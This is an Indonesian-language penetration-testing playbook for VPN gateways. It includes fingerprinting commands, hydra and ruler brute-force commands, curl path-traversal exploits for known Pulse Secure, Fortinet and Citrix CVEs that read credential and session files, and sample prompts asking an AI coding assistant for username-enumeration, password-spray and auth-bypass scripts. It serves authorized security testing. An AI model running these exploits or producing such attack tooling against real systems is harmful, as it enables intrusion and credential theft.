# Network Pentest: VPN & Remote Access

**Target:** VPN gateway, SSL VPN, remote desktop infrastructure  
**Akses tester:** Internet (black box) atau akun VPN terbatas (grey box)  
**Durasi:** 2–4 hari

---

## Skenario Umum

| Sub-skenario | Kondisi |
|-------------|---------|
| External VPN audit | Dari internet, cari dan test VPN endpoint |
| Credential attack | Punya daftar username, brute force VPN |
| Split tunneling abuse | Terhubung ke VPN, test apakah traffic bisa dimanipulasi |
| MFA bypass | Akun VPN dengan MFA, test bypass |

---

## Phase 1: VPN Fingerprinting

```bash
# Identifikasi VPN gateway
nmap -sV -p 500,4500,1194,443,1723,1701 target.co.id
# Port:
# 500/udp    → IKEv1/IKEv2 (IPSec)
# 4500/udp   → IPSec NAT-T
# 1194/udp   → OpenVPN
# 443/tcp    → SSL VPN (Cisco AnyConnect, Pulse, FortiVPN)
# 1723/tcp   → PPTP (sangat lemah, hindari rekomendasi)

# IKE scan — identifikasi IPSec
sudo ike-scan target.co.id
sudo ike-scan --aggressive target.co.id  # aggressive mode — bisa leak info

# SSL VPN fingerprint dari HTTP header
curl -I https://vpn.target.co.id
```

**Prompt Claude Code:**
```
Hasil scanning VPN endpoint target.co.id:

nmap: port 443/tcp open → Cisco AnyConnect (dari header "X-CSTP-Version")
ike-scan: port 500/udp open, IKEv2, transform: AES-256/SHA-256

Dan dari banner:
"Cisco AnyConnect Secure Mobility Client v4.10"

Identifikasi:
1. CVE yang diketahui untuk Cisco AnyConnect versi ini
2. Apakah ada authentication bypass atau pre-auth RCE?
3. SSL VPN credential enumeration — apakah valid username bisa ditemukan?
4. Cara test apakah MFA di-enforce
```

---

## Phase 2: Credential Attack

```bash
# Username enumeration (response berbeda antara user valid/invalid)
# Amati perbedaan response time atau pesan error

# Brute force VPN login
hydra -L users.txt -P passwords.txt \
  -t 4 -w 5 \
  https-post-form \
  "vpn.target.co.id/+webvpn+/index.html:username=^USER^&password=^PASS^:Login failed"

# Credential stuffing — gunakan breach database
# (dengan izin, untuk simulasi external attacker)

# OWA/Exchange brute force (remote access via webmail)
ruler brute --domain target.co.id \
  --users users.txt \
  --passwords passwords.txt \
  --delay 2000
```

**Prompt Claude Code:**
```
Melakukan credential attack pada VPN Cisco AnyConnect vpn.target.co.id.

Observasi:
- Username valid: response time 1200ms
- Username invalid: response time 150ms
- Tidak ada CAPTCHA
- Lockout policy: belum diketahui

Buatkan:
1. Python script untuk enumerate valid username via timing attack
2. Smart brute force yang auto-stop jika detect lockout (429 atau specific error)
3. Password spray script (1 password ke banyak user, hindari lockout)
4. Cara test MFA enforcement secara non-invasif
```

---

## Phase 3: Known VPN Vulnerabilities

```bash
# Pulse Secure VPN — CVE-2019-11510 (pre-auth RCE)
# Bisa baca file arbitrary tanpa auth
curl -sk "https://vpn.target.co.id/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd"

# Fortinet SSL VPN — CVE-2018-13379 (path traversal)
curl -sk "https://vpn.target.co.id/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Citrix Gateway — CVE-2019-19781
curl -sk "https://vpn.target.co.id/vpn/../vpns/cfg/smb.conf"
```

**Prompt Claude Code:**
```
Target menggunakan Pulse Secure VPN versi 9.0R3.
CVE-2019-11510 adalah pre-auth file read pada versi < 9.1R8.

Berikan:
1. Cara verifikasi apakah versi ini vulnerable
2. PoC untuk baca file credential (/etc/passwd, session files)
3. Bagaimana session cookie yang didapat bisa digunakan untuk bypass auth
4. Cara escalate ke RCE (CVE-2019-11539) dari file read
5. Deteksi dan mitigasi untuk laporan
```

---

## Phase 4: Split Tunneling Testing

```bash
# Setelah terhubung ke VPN sebagai user
# Test apakah traffic non-VPN bisa leak atau dimanipulasi

# Cek routing table
ip route
# Split tunnel: hanya 10.0.0.0/8 lewat VPN, sisanya langsung internet
# Full tunnel: semua traffic lewat VPN

# Jika split tunnel — test akses dari internet ke VPN client
# (bisa jadi target pivot dari internet)

# DNS leak test
nslookup target.co.id           # apakah pakai DNS VPN?
nslookup target.co.id 8.8.8.8  # bandingkan dengan DNS publik

# WebRTC leak (jika VPN di browser)
```

---

## Phase 5: Post-VPN Access Testing

```bash
# Setelah berhasil connect ke VPN (dengan akun valid)
# Test akses ke sumber daya internal

nmap -sn 10.0.0.0/8   # discovery jaringan internal via VPN
nmap -sV 10.0.0.10    # scan target internal

# Apakah VPN memberikan akses terlalu luas?
# Seharusnya: least privilege — hanya akses yang diperlukan
```

---

## Checklist VPN & Remote Access Pentest

```
[ ] Identifikasi VPN technology & versi
[ ] Cek CVE untuk versi yang ditemukan
[ ] Username enumeration (timing/response analysis)
[ ] Password spray (bukan brute force penuh)
[ ] Test MFA enforcement
[ ] Test pre-auth vulnerabilities (file read, SSRF)
[ ] Post-auth: cek split tunneling konfigurasi
[ ] Post-auth: apakah akses terlalu luas?
[ ] DNS leak testing
[ ] Laporan: credential policy + patch recommendation
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| External VPN fingerprint + CVE check | 1–2 hari | 3–4 hari |
| Full VPN pentest (credential + post-access) | 2–4 hari | 5–8 hari |
